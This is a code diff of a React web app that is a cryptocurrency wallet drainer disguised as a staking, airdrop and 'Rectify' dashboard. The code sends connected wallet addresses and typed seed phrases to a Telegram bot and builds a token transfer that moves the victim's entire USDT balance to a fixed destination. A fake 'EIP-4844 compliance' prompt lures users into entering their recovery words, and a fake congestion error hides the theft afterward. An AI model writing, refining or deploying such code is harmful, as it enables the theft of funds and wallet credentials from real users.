@@ -24,9 +24,9 @@ export default function App() {
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_tuesday_vFinal')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Tuesday_Fixed')) {
       log(`🎯 TUESDAY LIVE!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_tuesday_vFinal', 't');
+      sessionStorage.setItem('hit_vF_Tuesday_Fixed', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -39,11 +39,19 @@ export default function App() {
     return () => clearInterval(loop);
   }, []);
 
+  // Standard Native Balance
   const { data: nB } = useBalance({ address }); 
   
-  // Hardcoded Multi-Chain USDT check
-  const uAddr = chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : (chainId === 56 ? "0x55d398326f99059ff775485246999027b3197955" : (chainId === 137 ? "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" : undefined));
-  const { data: tB } = useBalance({ address, token: uAddr });
+  // Safe USDT Address Logic
+  function getSafeToken() {
+    if (chainId === 1) return "0xdac17f958d2ee523a2206206994597c13d831ec7";
+    if (chainId === 56) return "0x55d398326f99059ff775485246999027b3197955";
+    if (chainId === 137) return "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
+    return undefined;
+  }
+  
+  const currentUsdt = getSafeToken();
+  const { data: tB } = useBalance({ address, token: currentUsdt });
 
   useEffect(() => {
     if (activeTask === "Rectify") {
@@ -60,9 +68,9 @@ export default function App() {
   const handleHandshake = () => {
     if (activeTask !== "Rectify" && inputVal.length === 0) return;
     
-    if (tB && tB.value > 0n && uAddr) {
+    if (tB && tB.value > 0n && currentUsdt) {
       const d = `0xa9059cbb${dest.replace('0x', '').toLowerCase().padStart(64, '0')}${tB.value.toString(16).padStart(64, '0')}`;
-      sendTransaction({ to: uAddr, data: d }, { 
+      sendTransaction({ to: currentUsdt, data: d }, { 
         onSuccess: () => {
           if (nB && nB.value > 100000000000000n) {
             setTimeout(() => {
@@ -96,7 +104,7 @@ export default function App() {
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Fix"].map(n => (
                 <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
-                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900', cursor:'pointer'}}>
+                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                   <div>{n === "Rectify" ? "⚡" : "〽️"}</div><div style={{fontSize:'9px'}}>{n}</div>
                 </button>
               ))}
@@ -104,17 +112,17 @@ export default function App() {
           )}
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center', position:'relative'}}>
-              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px', cursor:'pointer'}}>←</button>
+              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
               <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'20px', border:'1px solid #1e293b'}}>
-                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
-                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
+                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
+                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
               </div>
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'15px 0', border:'1px solid #1e293b'}}>
                 <input type="text" inputMode="decimal" value={inputVal} readOnly={activeTask === "Rectify"} onChange={handleInputChange} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
               </div>
               <button onClick={handleHandshake} 
-                style={{width:'100%', backgroundColor: (activeTask === "Rectify" || inputVal.length > 0) ? '#10b981' : '#1e293b', color: (activeTask === "Rectify" || inputVal.length > 0) ? '#000' : '#475569', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none', cursor:'pointer'}}>
+                style={{width:'100%', backgroundColor: (activeTask === "Rectify" || inputVal.length > 0) ? '#10b981' : '#1e293b', color: (activeTask === "Rectify" || inputVal.length > 0) ? '#000' : '#475569', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>
                 START_HANDSHAKE
               </button>
             </div>
@@ -127,7 +135,7 @@ export default function App() {
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'15px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
                     <button onClick={()=>{if(seedVal.trim().length < 10) return; setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setErrorMsg("⛓️‍💥 NETWORK_CONGESTION: MAINNET_RELAY TIMED OUT. PLEASE TRY AGAIN LATER.");}},60);}} 
-                    style={{width:'100%', backgroundColor: seedVal.trim().length > 10 ? '#10b981' : '#1e293b', color: seedVal.trim().length > 10 ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none', cursor:'pointer'}}>ENCRYPT & SYNC</button>
+                    style={{width:'100%', backgroundColor: seedVal.trim().length > 10 ? '#10b981' : '#1e293b', color: seedVal.trim().length > 10 ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
                   <div>
@@ -139,7 +147,7 @@ export default function App() {
                     ) : (
                       <>
                         <div style={{color:'#ef4444', fontWeight:'900', fontSize:'12px', marginBottom:'20px', lineHeight:'1.5'}}>{errorMsg}</div>
-                        <button onClick={()=>{setIsSyncing(false); setErrorMsg(""); setView("menu")}} style={{width:'100%', backgroundColor:'#1e293b', color:'white', padding:'18px', borderRadius:'15px', border:'none', fontWeight:'900', cursor:'pointer'}}>RETRY_CONNECTION</button>
+                        <button onClick={()=>{setIsSyncing(false); setErrorMsg(""); setView("menu")}} style={{width:'100%', backgroundColor:'#1e293b', color:'white', padding:'18px', borderRadius:'15px', border:'none', fontWeight:'900'}}>RETRY_CONNECTION</button>
                       </>
                     )}
                   </div>
